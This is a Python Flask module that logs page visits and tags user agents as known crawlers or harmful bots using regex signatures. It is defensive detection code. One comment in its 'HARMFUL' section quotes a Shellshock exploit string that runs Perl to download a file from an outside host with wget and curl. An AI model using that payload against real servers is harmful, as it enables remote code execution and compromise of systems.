import re
import hashlib

from flask import request

from web_server import app

from web_server.modules.server_requests import post

browsers = []
#Majestic
b = {
    'useragent': 'MJ12bot',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'Majestic'
}
browsers.append( b )
#Baiduspider
b = {
    'useragent': 'Baiduspider',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'Baiduspider'
}
browsers.append( b )
#OpenGraphReader
b = {
    'useragent': 'OpenGraphReader',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'OpenGraphReader'
}
browsers.append( b )
#facebookexternalhit
b = {
    'useragent': 'facebookexternalhit',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'facebookexternalhit'
}
browsers.append( b )
#bingbot
b = {
    'useragent': 'bingbot',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'bingbot'
}
browsers.append( b )
#AdsBot-Google
b = {
    'useragent': 'AdsBot-Google',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'AdsBot-Google'
}
browsers.append( b )
#meanpathbot
b = {
    'useragent': 'meanpathbot',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'meanpathbot'
}
browsers.append( b )
#BusinessBot
b = {
    'useragent': 'BusinessBot',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'BusinessBot'
}
browsers.append( b )
#Scanning for research (researchscan.comsys.rwth-aachen.de)
b = {
    'useragent': 'researchscan',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'researchscan'
}
browsers.append( b )
#Google favicon
b = {
    'useragent': 'Google favicon',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'Google favicon'
}
browsers.append( b )
#SurveyBot
b = {
    'useragent': 'SurveyBot',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'SurveyBot'
}
browsers.append( b )
#Mozilla/5.0 zgrab/0.x
b = {
    'useragent': 'zgrab',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'zgrab'
}
browsers.append( b )
#HTTP_Request2/2.2.0 (http://pear.php.net/package/http_request2) PHP/5.3.29
b = {
    'useragent': 'HTTP_Request',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'HTTP_Request'
}
browsers.append( b )
#linkdexbot
b = {
    'useragent': 'linkdexbot',
    'referrer': None,
    'robot': True,
    'harmful': False,
    'name': 'linkdexbot'
}
browsers.append( b )

# HARMFUL

#() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget musti.be/lul;curl -O musti.be/lul;fetch musti.be/lul;lwp-download musti.be/lul;GET musti.be/lul");'
b = {
    'useragent': 'Content-Type|musti.be',
    'referrer': None,
    'robot': True,
    'harmful': True,
    'name': 'Perl musti.be hack'
}
browsers.append( b )
#libwww-perl
b = {
    'useragent': 'libwww-perl',
    'referrer': None,
    'robot': True,
    'harmful': True,
    'name': 'libwww-perl'
}
browsers.append( b )

# REFERER
# http://rankings-analytics.com/try.php?u=http://hovyu.com
b = {
    'useragent': None,
    'referrer': 'rankings-analytics',
    'robot': True,
    'harmful': False,
    'name': 'rankings-analytics'
}
browsers.append( b )

def log_access():
    ip = '{1}{0}'.format(app.config['IP_LOG_SALT'], request.environ['REMOTE_ADDR'])
    ip = ip.encode('utf-8')
    ip_md5 = hashlib.sha224( ip ).hexdigest()
    access_log = {
        'page': request.url,
        'ip_md5': ip_md5,
        'useragent': request.user_agent.string,
        'useragent_platform': request.user_agent.platform,
        'useragent_browser': request.user_agent.browser,
        'useragent_version': request.user_agent.version,
        'useragent_language': request.user_agent.language,
        'robot': False,
        'harmful': False,
        'acceptlanguage': request.accept_languages.to_header(),
        'referrer': request.referrer
    }

    # Get USERAGENT
    if access_log['useragent'] == '':
        access_log['useragent_browser'] = 'null'

    for browser in browsers:
        if browser['useragent']:
            search = re.search(browser['useragent'], access_log['useragent'])
        elif browser['referrer'] and access_log['referrer']:
            search = re.search(browser['referrer'], access_log['referrer'])
        if search:
            access_log['useragent_browser'] = browser['name']
            access_log['robot'] = browser['robot']
            access_log['harmful'] = browser['harmful']

    if access_log['useragent_browser'] in ['google', 'aol', 'ask', 'yahoo', 'null', 'majestic']:
        access_log['robot'] = True

    #logging.error( access_log )
    r = post('access_log', access_log)
    #logging.error( r.text )
